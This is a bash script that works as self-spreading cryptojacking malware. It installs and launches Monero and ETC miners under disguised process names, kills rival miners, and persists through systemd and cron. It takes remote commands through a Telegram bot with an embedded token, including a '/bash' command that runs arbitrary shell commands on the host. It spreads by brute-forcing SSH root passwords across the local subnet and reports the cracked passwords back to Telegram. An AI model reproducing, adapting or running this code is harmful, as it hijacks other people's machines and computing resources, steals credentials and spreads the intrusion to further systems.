#!/bin/bash

#---------------------------------------------------#
#                   CONFIG                          #
#---------------------------------------------------#
KRIPTEX_USERNAME="krxYNV2DZQ"
TELEGRAM_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TELEGRAM_CHAT_ID="7032066912"

ETC_POOLS=("etc.kryptex.network:7033" "etc-us.kryptex.network:7033" "etc-eu.kryptex.network:7033")
XMR_POOLS=("xmr.kryptex.network:7029" "xmr-backup.network:7029")
XMR_INSTANCES=3
SSH_COMMON_PASSWORDS=("root" "admin" "password" "123456" "toor" "changeme" "P@ssw0rd" "qwerty")

#---------------------------------------------------#
#                   SYSTEM VARS                     #
#---------------------------------------------------#
LOGFILE="$HOME/mining_control.log"
ANTISPAM_FILE="/tmp/miner_antispam_$(id -u)"
INFECTED_MARKER="/tmp/.already_infected_$(echo $KRIPTEX_USERNAME | md5sum | cut -d' ' -f1)"
LOG_TAIL=50
WATCHDOG_INTERVAL=60
WATCHDOG_TIMEOUT=300
PERIODIC_REPORT_INTERVAL=21600

if [ "$(id -u)" -eq 0 ]; then
    IS_ROOT=true
    MINING_PATH="/opt/mining"
    LOG_PATH="/var/log"
else
    IS_ROOT=false
    MINING_PATH="$HOME/opt/mining"
    LOG_PATH="/tmp"
fi

#---------------------------------------------------#
#                  HELPER FUNCTIONS                 #
#---------------------------------------------------#

get_hostname() {
    hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "$HOSTNAME" 2>/dev/null || echo "unknown_host"
}

get_server_ip() {
    curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || echo "0.0.0.0"
}

SERVER_IP=$(get_server_ip)
WORKER_ID=$(echo "$SERVER_IP" | tr -d '.')
WORKER_NAME="${KRIPTEX_USERNAME}.${WORKER_ID}"

log_event() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') | $*" >> "$LOGFILE"
}

send_telegram_message() {
    local message="$1"
    command -v curl &>/dev/null || return
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "text=${message}" \
        -d "parse_mode=HTML" >/dev/null 2>&1
    log_event "telegram message: ${message:0:100}..."
}

download_file() {
    local url="$1"
    local out="$2"
    if command -v wget &>/dev/null; then
        wget --no-check-certificate -q "$url" -O "$out"
    elif command -v curl &>/dev/null; then
        curl -L -k -s "$url" -o "$out"
    else
        log_event "ERROR: wget/curl not found. Cannot download $url"
        return 1
    fi
}

find_working_pool() {
    local result
    for pool in "$@"; do
        host=$(echo "$pool" | awk -F: '{print $1}')
        port=$(echo "$pool" | awk -F: '{print $2}')
        if command -v nc &>/dev/null && nc -z -w 2 "$host" "$port" 2>/dev/null; then
            result="$pool"
            break
        fi
    done
    [ -z "$result" ] && result="$1"
    echo "$result"
}

#---------------------------------------------------#
#                  CORE LOGIC                       #
#---------------------------------------------------#

cleanup_miner_processes() {
    log_event "Cleaning up competing miner processes..."
    local patterns="miner|xmrig|ComfUI|lolMiner|crypto|eth|xmr|monero"
    local whitelist="ngrok|ssh|screen|ComfUI|bash|zsh|tmux|$$|cryptex|EtcUi|XmrUi"
    local cleared=0
    
    ps aux | grep -Ei "$patterns" | grep -v grep | while read -r line; do
        pid=$(echo "$line" | awk '{print $2}')
        pname=$(echo "$line" | awk '{print $11}')
        
        if [[ "$pid" == "$$" ]] || echo "$pname" | grep -Eiq "$whitelist"; then
            continue
        fi
        
        kill -9 "$pid" 2>/dev/null && log_event "Killed process $pid ($pname)" && cleared=$((cleared+1))
    done
    log_event "Cleaned processes: $cleared"
}

install_dependencies() {
    log_event "Checking dependencies..."
    if $IS_ROOT; then
        for pkg in curl cron jq nc sshpass bc hostname; do
            if ! command -v "$pkg" &>/dev/null; then
                (apt-get update -qq >/dev/null 2>&1 && apt-get install -y "$pkg" >/dev/null 2>&1) || \
                (yum install -y "$pkg" >/dev/null 2>&1) || \
                (apk add "$pkg" >/dev/null 2>&1)
            fi
        done
    fi
}

install_miners() {
    log_event "Installing miners..."
    mkdir -p "${MINING_PATH}/etc" && cd "${MINING_PATH}/etc"
    download_file "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz" "lol.tar.gz" && \
    tar -xzf lol.tar.gz --strip-components=1 && rm -f lol.tar.gz && \
    chmod +x "${MINING_PATH}/etc/lolMiner" || { log_event "ETC miner install failed"; return 1; }
    
    mkdir -p "${MINING_PATH}/xmr" && cd "${MINING_PATH}/xmr"
    download_file "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz" "xmr.tar.gz" && \
    tar -xzf xmr.tar.gz --strip-components=1 && rm -f xmr.tar.gz && \
    chmod +x "${MINING_PATH}/xmr/xmrig" || { log_event "XMR miner install failed"; return 1; }
    
    log_event "Miners installed."
    return 0
}

setup_autostart() {
    log_event "Setting up persistence..."
    local main_script_path=$(readlink -f "$0")

    # Method 1: Systemd (preferred for root)
    if $IS_ROOT && command -v systemctl &>/dev/null; then
        cat > /etc/systemd/system/mining-daemon.service <<EOF
[Unit]
Description=Mining Control Daemon
After=network.target
[Service]
ExecStart=/bin/bash $main_script_path
Restart=always
RestartSec=30
User=root
[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload &>/dev/null
        systemctl enable mining-daemon.service &>/dev/null
        systemctl start mining-daemon.service &>/dev/null
        log_event "Systemd service created and enabled."
        return
    fi

    # Method 2: Cron (fallback)
    if command -v crontab &>/dev/null && (pgrep -f "cron" >/dev/null || pgrep -f "crond" >/dev/null); then
        (crontab -l 2>/dev/null | grep -v "$main_script_path"; \
         echo "@reboot $main_script_path &"; \
         echo "* * * * * if ! pgrep -f 'telegram_listener'; then bash $main_script_path & fi") | crontab -
        log_event "Cron persistence installed."
    else
        log_event "WARNING: No working persistence method (Systemd/Cron) found. Script will not survive reboot."
    fi
}


start_all_miners() {
    log_event "Starting all miners..."
    local ETC_POOL_SELECTED=$(find_working_pool "${ETC_POOLS[@]}")
    local XMR_POOL_SELECTED=$(find_working_pool "${XMR_POOLS[@]}")

    (exec -a "EtcUi" "${MINING_PATH}/etc/lolMiner" --algo ETCHASH --pool "$ETC_POOL_SELECTED" --user "${WORKER_NAME}" --tls off --nocolor) &> "${LOG_PATH}/etc-miner.log" &
    log_event "Started EtcUi"

    for i in $(seq 1 $XMR_INSTANCES); do
        local process_name="XmrUi-${i}"
        (exec -a "$process_name" "${MINING_PATH}/xmr/xmrig" -o "$XMR_POOL_SELECTED" -u "${WORKER_NAME}" -p x --randomx-1gb-pages) &> "${LOG_PATH}/xmr-miner-${i}.log" &
        log_event "Started $process_name"
        sleep 1
    done
}

#---------------------------------------------------#
#                  DAEMONS                          #
#---------------------------------------------------#

watchdog() {
    while true; do
        sleep $WATCHDOG_INTERVAL
        
        if ! pgrep -f "^EtcUi$" >/dev/null; then
            log_event "WATCHDOG: EtcUi not running, restarting."
            pkill -9 -f "^EtcUi$"
            local ETC_POOL_SELECTED=$(find_working_pool "${ETC_POOLS[@]}")
            (exec -a "EtcUi" "${MINING_PATH}/etc/lolMiner" --algo ETCHASH --pool "$ETC_POOL_SELECTED" --user "${WORKER_NAME}" --tls off --nocolor) &> "${LOG_PATH}/etc-miner.log" &
        fi

        for i in $(seq 1 $XMR_INSTANCES); do
            local process_name="XmrUi-${i}"
            if ! pgrep -f "^${process_name}$" >/dev/null; then
                log_event "WATCHDOG: $process_name not running, restarting."
                pkill -9 -f "^${process_name}$"
                local XMR_POOL_SELECTED=$(find_working_pool "${XMR_POOLS[@]}")
                (exec -a "$process_name" "${MINING_PATH}/xmr/xmrig" -o "$XMR_POOL_SELECTED" -u "${WORKER_NAME}" -p x --randomx-1gb-pages) &> "${LOG_PATH}/xmr-miner-${i}.log" &
            fi
        done
    done
}

periodic_report() {
     while true; do
        sleep $PERIODIC_REPORT_INTERVAL
        local uptimes=$(ps -eo etime,comm 2>/dev/null | grep -E 'EtcUi|XmrUi' | awk '{print $2, $1}' | tr '\n' '; ')
        local etc_hash=$(tail -20 "${LOG_PATH}/etc-miner.log" 2>/dev/null | grep -o "Average speed.*" | tail -1 | awk '{print $3" "$4}')
        local xmr_total_hash=0
        local xmr_hashes=""
        for i in $(seq 1 $XMR_INSTANCES); do
            local xmr_hash=$(tail -20 "${LOG_PATH}/xmr-miner-${i}.log" 2>/dev/null | grep -o "speed [0-9.]*" | tail -1 | awk '{print $2}')
            if [[ -n "$xmr_hash" && "$xmr_hash" =~ ^[0-9.]+$ ]]; then
                xmr_total_hash=$(echo "$xmr_total_hash + $xmr_hash" | bc 2>/dev/null || echo "$xmr_total_hash")
                xmr_hashes="${xmr_hashes}#${i}: ${xmr_hash} H/s\n"
            fi
        done
        
        send_telegram_message "📊 Auto-report
Host: $(get_hostname)
IP: $(get_server_ip)
Worker: $WORKER_NAME
Uptime: $uptimes
ETC: ${etc_hash:-N/A}
XMR Total: ${xmr_total_hash} H/s
${xmr_hashes}"
        log_event "Periodic report sent."
    done
}

telegram_listener() {
    log_event "Telegram listener started."
    local offset=0
    while true; do
        local updates=$(curl -s "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=$offset&timeout=30" 2>/dev/null)
        if [[ -z "$updates" || "$updates" == "null" ]]; then sleep 5; continue; fi
        
        echo "$updates" | jq -c '.result[]?' 2>/dev/null | while read -r line; do
            if [[ -z "$line" || "$line" == "null" ]]; then continue; fi
            local msg=$(echo "$line" | jq -r '.message.text' 2>/dev/null)
            local uid=$(echo "$line" | jq -r '.message.from.id' 2>/dev/null)
            local upd_id=$(echo "$line" | jq -r '.update_id' 2>/dev/null)
            
            [[ -n "$upd_id" ]] && offset=$((upd_id + 1))
            [[ "$uid" != "$TELEGRAM_CHAT_ID" ]] && continue
            
            log_event "Admin command: $msg"
            
            case "$msg" in
                "/status $WORKER_NAME")
                    local uptimes=$(ps -eo etime,comm | grep -E 'EtcUi|XmrUi' | awk '{print $2, $1}' | tr '\n' '; ')
                    send_telegram_message "Status on $(get_hostname): $(uptime)
UPTIMES: $uptimes"
                    ;;
                "/restart $WORKER_NAME")
                    send_telegram_message "Restarting all miners on $WORKER_NAME..."
                    pkill -9 -f "EtcUi"; pkill -9 -f "XmrUi-"
                    sleep 2
                    start_all_miners
                    send_telegram_message "Miners restarted."
                    ;;
                "/stop $WORKER_NAME")
                    send_telegram_message "Stopping all miners on $WORKER_NAME."
                    pkill -9 -f "EtcUi"; pkill -9 -f "XmrUi-"
                    send_telegram_message "Miners stopped."
                    ;;
                "/log $WORKER_NAME")
                    local log_data=$(tail -n $LOG_TAIL "$LOGFILE" 2>/dev/null)
                    send_telegram_message "Log for $WORKER_NAME:\n<pre>${log_data:-Log is empty}</pre>"
                    ;;
                /bash\ $WORKER_NAME*)
                    local bashcmd="${msg#"/bash $WORKER_NAME "}"
                    local out=$(bash -c "$bashcmd" 2>&1 | head -c 4000)
                    send_telegram_message "<pre>$(get_hostname):~# $bashcmd\n$out</pre>"
                    ;;
            esac
        done
        sleep 3
    done
}

#---------------------------------------------------#
#                  SPREADER                         #
#---------------------------------------------------#

try_ssh_bruteforce() {
    local target_ip="$1"
    command -v sshpass &>/dev/null || return 1
    for pass in "${SSH_COMMON_PASSWORDS[@]}"; do
        if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@"$target_ip" "echo connected" &>/dev/null; then
            echo "$pass"
            return 0
        fi
    done
    return 1
}

deploy_to_local_network() {
    if $IS_ROOT; then
      [ -f "$INFECTED_MARKER" ] && return
      touch "$INFECTED_MARKER"
    fi

    log_event "Starting network deployment..."
    local my_ip=$(get_server_ip)
    local net_base=$(echo "$my_ip" | awk -F. '{print $1"."$2"."$3"."}')
    
    for i in $(seq 1 254); do
        (
            local target_ip="$net_base$i"
            [[ "$target_ip" == "$my_ip" ]] && continue
            
            nc -z -w 1 "$target_ip" 22 2>/dev/null || return
            log_event "Found SSH on $target_ip"
            
            local found_pass=$(try_ssh_bruteforce "$target_ip")
            if [[ -n "$found_pass" ]]; then
                log_event "Success with pass '$found_pass' for $target_ip"
                sshpass -p "$found_pass" scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$0" "root@$target_ip:/tmp/deploy.sh"
                sshpass -p "$found_pass" ssh -o StrictHostKeyChecking=no "root@$target_ip" "bash /tmp/deploy.sh &" && \
                send_telegram_message "✅ Deployed to $target_ip via SSH pass: $found_pass"
            fi
        ) &
    done
    wait
    log_event "Network deployment finished."
}

#---------------------------------------------------#
#                  MAIN EXECUTION                   #
#---------------------------------------------------#

main() {
    if pgrep -f "telegram_listener" >/dev/null; then
        echo "Daemon already running. Exiting bootstrap."
        exit
    fi

    send_telegram_message "🚀 **Deployment started on $(get_hostname)**
IP: ${SERVER_IP} | Worker: ${WORKER_NAME} | User: $(whoami)"
    
    install_dependencies
    cleanup_miner_processes
    if ! install_miners; then
        send_telegram_message "❌ **FATAL: Miner installation failed on $(get_hostname).**"
        exit 1
    fi
    setup_autostart
    start_all_miners
    
    send_telegram_message "✅ **Deployment successful on $(get_hostname)!**"
    
    # Daemonize
    ( watchdog &> /dev/null & )
    ( periodic_report &> /dev/null & )
    ( deploy_to_local_network &> /dev/null & )
    
    # Self-destruct if possible
    # if [ -w "$0" ]; then rm -f -- "$0"; fi

    telegram_listener
}

main
